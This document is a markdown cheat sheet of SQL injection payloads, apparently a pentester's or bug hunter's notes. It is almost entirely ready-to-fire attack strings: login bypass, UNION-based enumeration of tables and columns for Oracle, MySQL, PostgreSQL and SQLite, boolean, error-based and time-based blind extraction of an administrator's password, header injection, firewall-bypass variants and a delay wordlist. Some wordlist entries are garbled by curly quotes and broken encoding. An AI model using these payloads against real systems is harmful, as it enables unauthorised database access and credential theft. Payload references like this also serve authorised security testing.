## SQLi Payloads
___

### External Links

https://portswigger.net/web-security/sql-injection/cheat-sheet
___

### Examples
```sql
&topsort=flowers or sleep(3) >> Url

&location=(select*from(select(sleep(3)))a) >> Cookie

&direction=desc,(select*from(select(sleep(3)))a)& >> Cookie

"accid":"25 and sleep(3)#" >> In json data

&log=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z&pwd= >> Post data

&comment_id=291751-sleep(5)& >>

filename="poc.js' (select*from(select(sleep(3)))a) '.pdf" >> Uploading File

asd</script>') UNION SELECT 1,SLEEP(10),3,4,5-- - >> Via file upload vulnerability

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'--

xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

'; IF (1=1) WAITFOR DELAY '0:0:10'--

```
### Determinig SQLi Vulnerablity & Login Bypass
```sql
1 or 1=1-- - >> Input box non string.

1' or 1=1-- - >> Input box string.

1' or 'abc'='abc'-- -

1') or 1=1-- -

1' or 1=1-- -%00 >> For bypassing firewall.

' AND '1'='1
```
### Parameter Testing For Time Based Blind
```sql
or sleep(5)

(select*from(select(sleep(5)))a)

0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z

1'XOR(if(now()=sysdate(),sleep(3),0))OR' >> PATH

(select*from(select(sleep(3)))a)
```
### Cookie testing 
```sql
' and 1=1-- - >> Conditional response (Boolean)

' || (select ' ') || ' >> Conditional error

' ||  (SELECT SLEEP(10))-- - >> Time delays

(select*from(select(sleep(3)))a)
```
### Determining column numbers
```sql

' order by 1-- -

' union select null, null from dual-- - >> Oracle

' union select null, null-- - >> Non Oracle

union select null, null >> Without quote in vulnerable parameter

and 1=2 union select null, null >> Without quote in vulnerable parameter
```
### To find a column containing strings
```sql
' union select null, 'null', null-- -
```
### To fetch database version
```sql
' union select banner, null from v$version-- - >> Oracle

' union select null, @@version-- - >> Mysql, MSsql

' union select null, version()-- - >> PostgreSQL

' union select null, sqlite_version()-- - >> SQLite
```

### To identify vulnerable columns
```sql
' union select 1,2,3,4-- -

union select 1,2,3,4 >> Without quote in vulnerable parameter

and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
```
### String concatenation
```sql
Oracle 	'foo'||'bar'
Microsoft 	'foo'+'bar'
PostgreSQL 	'foo'||'bar'
MySQL 	'foo' 'bar' [Note the space between the two strings]
CONCAT('foo','bar')
```

### SQLite Database info retrieving
```sql
(SELECT group_concat(tbl_name) FROM sqlite_master)

(SELECT sql FROM sqlite_master WHERE name ='[table name here]') >> To retrieve data from one table.

(SELECT sql FROM sqlite_master) >> Useful to retrieve all table and column in a single payload.

(SELECT group_concat([column name here]) from [table name here])

(SELECT group_concat(column1 || "," || column2 || "," || column3 || ":") from [table name here]) >> To retrieve multiple columns data. 
```

### Oracle Database info retrieving
```sql
' union SELECT table_name,null FROM all_tables-- -

' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'table name'-- - 

' union select [column name here],null from [table name here]-- - 
```

### PostgreSQL Database info retrieving
```sql
' union SELECT table_name,null FROM information_schema.tables-- -

' union SELECT column_name,null FROM information_schema.columns WHERE table_name='[table name]'-- -

' union select [column name here],null from [table name here]-- -

' union select 1, column1 || colum2 from [database name here]-- -

'||(select column1 from [table name here] limit 1)-- - >> Visible error based sqli in cookie value.

'||cast((select column1 from [table name here] LIMIT 1) AS INT)-- >> Visible error based sqli in cookie value.
```

### Mysql Database info retrieving
```sql
' union SELECT table_name,null,null FROM information_schema.tables where table_schema='[Database name here]'

' union SELECT null,null,column_name,null FROM information_schema.columns where table_name='[table name]' limit 0,1

' union select null,null,[column name here],null from [table name here]

and 1=2 union SELECT table_name,null,null FROM information_schema.tables where table_schema='[Database name here]' >> Without qoute in vulnerable parameter

and 1=2 union SELECT null,null,column_name,null FROM information_schema.columns where table_name='[table name]' limit 0,1

and 1=2 union select null,null,[column name here],null from [table name here]
```

### Blind based Boolean SQL injection with conditional responses (Visible message)
```sql
' and (select 'x' from users LIMIT 1)='x'-- - >> To determine if the [users] table is exist or not.

' and (select username from users where username='administrator')='administrator'-- - >> To determine the username

' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'-- -

' and (select SUBSTRING(password,1,1) from users where username='administrator')='a'-- -
```

### Blind SQL injection with conditional errors (No visible message)
```sql
' || (select ' ') || ' >> Non Oracle

' || (select ' ' from dual) || ' >> Oracle #200 ok means Oracle database exists.
```

### Blind SQL injection with conditional errors to determine a table, other info exist or not
```sql
' || (select ' ' from [table name here] where rownum = 1) || '-- - >> Oracle #200 ok means that table exists.

select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' >> Oracle #500 error means exists.

select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and LENGTH(password)>20 >> Oracle #500 error means exists.

select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and SUBSTRING(password,1,1)='a' >> Oracle #500 error means exists.
```

### Blind SQL injection with time delays
```sql
' UNION SELECT SLEEP(5);-- -

' || (dbms_pipe.receive_message(('a'),10))-- - >> Oracle

' || (WAITFOR DELAY '0:0:10')-- - >> Microsoft

' ||  (SELECT pg_sleep(10))-- - >> PostgreSQL

' ||  (SELECT SLEEP(10))-- - >> MySQL
```

### Blind SQL injection with time delays and information retrieval
```sql
1) PostrgreSQL

' || (select case when (1=1) then pg_sleep(10 ) else pg_sleep (-1) end)-- -

' || (select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from [table name here])-- - or, ';select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from users-- -

' || (select case when (username='[username here]') then pg_sleep(5) else pg_sleep(-1) end from [table name here])-- -

' || (select case when (username='[username here]' and LENGTH(password)>n) then pg_sleep(10) else pg_sleep(-1) end from users)-- -

';select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from users--
```

### Visible Error-Based Sql Injection
```sql
'||cast((select version() LIMIT 1) AS INT)--

'||cast((select username from users LIMIT 1) AS INT)--  >> cast for PostgreSQL

'||cast((select password from users LIMIT 1) AS INT)--
```

### HTTP Header based SQLi
```sql
x-forwarded-for: 127.0.0.1' union select 1,2,3 and sleep(2)-- -
```

### Inception based SQLi
```sql
and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
```
### Wordlist
```sql
    or sleep 5 —
    or sleep 5
    or sleep(5) —
    or sleep(5)

    or SELECT pg_sleep(5);
    (SELECT pg_sleep(5))
    pg_sleep(5) —
    1 or pg_sleep(5) —
    “ or pg_sleep(5) —
    ‘ or pg_sleep(5) —
    1) or pg_sleep(5) —

    ;waitfor delay ‘0:0:5’ —
    ‘;WAITFOR DELAY ‘0:0:5’ —
    );waitfor delay ‘0:0:5’ —
    ‘;waitfor delay ‘0:0:5’ —
    “;waitfor delay ‘0:0:5’ —
    ‘);waitfor delay ‘0:0:5’ —
    “);waitfor delay ‘0:0:5’ —
    ));waitfor delay ‘0:0:5’ —
    ‘));waitfor delay ‘0:0:5’ —
    “));waitfor delay ‘0:0:5’ —
    “) IF (1=1) WAITFOR DELAY ‘0:0:5’ —
    ‘;%5waitfor%5delay%5’0:0:5′%5 — %5
    ‘ WAITFOR DELAY ‘0:0:5’ —
```
**Routed SQL Injection POC:** [Click...](https://youtu.be/mNj73yI8GEk?si=yuw2-_aGF0BjQuUk)
